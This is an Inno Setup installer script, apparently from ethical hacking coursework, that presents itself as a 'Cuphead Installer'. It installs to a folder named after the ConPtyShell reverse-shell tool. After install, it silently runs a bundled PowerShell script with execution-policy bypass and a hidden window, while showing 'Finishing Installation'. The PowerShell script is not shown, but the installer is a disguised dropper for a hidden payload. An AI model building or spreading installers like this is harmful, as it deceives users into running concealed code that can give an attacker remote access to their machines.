[Setup]
AppName=Cuphead Installer
AppVersion=1.0
DefaultDirName={pf}\ConPtyShell
DefaultGroupName=ConPtyShell
OutputDir=.
OutputBaseFilename=setup

[Files]
Source: "D:\MS\Canisius\Semester 2\Ethical Hacking\sample.ps1"; DestDir: "{app}"; Flags: ignoreversion

[Run]
Filename: "powershell.exe"; Parameters: "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden  -File ""{app}\sample.ps1"""; StatusMsg: "Finishing Installation"; Flags:runhidden
